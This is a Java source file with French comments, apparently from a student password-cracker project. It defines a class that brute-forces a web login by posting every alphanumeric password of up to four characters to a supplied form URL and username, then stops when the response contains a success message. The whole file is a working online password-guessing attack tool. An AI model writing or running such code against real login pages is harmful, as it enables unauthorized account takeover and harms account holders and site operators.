package com.example.passwordcracker;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

// classe OnlineBruteForceCracker qui permet de cracker un mot de passe en utilisant une méthode de force brute en ligne
public class OnlineBruteForceCracker implements BruteForceCracker {
    private static final char[] CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".toCharArray();
    private static final int PASSWORD_LENGTH = 4; // longueur du mot de passe
    private final String formUrl; // URL du formulaire de connexion
    private final String username; // nom d'utilisateur
    private final String successMessage;  // message de succès

    public OnlineBruteForceCracker(String formUrl, String username, String successMessage) {
        this.formUrl = formUrl; // initialisation des attributs
        this.username = username;
        this.successMessage = successMessage;
    }

    // méthode pour cracker le mot de passe en utilisant une méthode de force brute en ligne
    @Override
    public void crack() {
        System.out.println("Commencement de la méthode de force brute en ligne...");
        for (int len = 1; len <= PASSWORD_LENGTH; len++) { // pour chaque longueur de mot de passe
            bruteForceRecursion("", len);
        }
        System.out.println("Fin de la méthode de force brute en ligne.");
    }
    // méthode récursive pour tester toutes les combinaisons possibles
    private void bruteForceRecursion(String prefix, int len) {
        if (len == 0) {
            String candidate = prefix;
            if (submitFormWithPassword(candidate)) { // si le mot de passe est trouvé
                System.out.println("Mot de passe trouvé par force brute en ligne: " + candidate);
                System.exit(0);
            }
            return;
        }
        // teste toutes les combinaisons possibles
        for (char c : CHARSET) { // pour chaque caractère du charset
            String newPrefix = prefix + c; // ajoute le caractère au préfixe
            bruteForceRecursion(newPrefix, len - 1); // appel récursif avec le nouveau préfixe
        }
    }

    // méthode pour soumettre le formulaire avec le mot de passe
    private boolean submitFormWithPassword(String password) {
        try (CloseableHttpClient httpClient = HttpClients.createDefault()) {
            HttpPost httpPost = new HttpPost(formUrl); // initialisation de la requête POST

            List<NameValuePair> params = new ArrayList<>(); // création de la liste de paramètres
            params.add(new BasicNameValuePair("username", username)); // ajout du nom d'utilisateur
            params.add(new BasicNameValuePair("password", password)); // ajout du mot de passe
            httpPost.setEntity(new UrlEncodedFormEntity(params)); // ajout des paramètres à la requête

            // envoi de la requête POST
            HttpResponse response = httpClient.execute(httpPost);

            // lecture de la réponse
            BufferedReader reader = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
            String line;
            StringBuilder responseContent = new StringBuilder(); // initialisation du contenu de la réponse
            while ((line = reader.readLine()) != null) {
                responseContent.append(line);
            }
            // vérification si la réponse contient le message de succès
            return responseContent.toString().contains(successMessage);
        } catch (Exception e) {
            e.printStackTrace(); // affichage de l'erreur
            return false;
        }
    }
}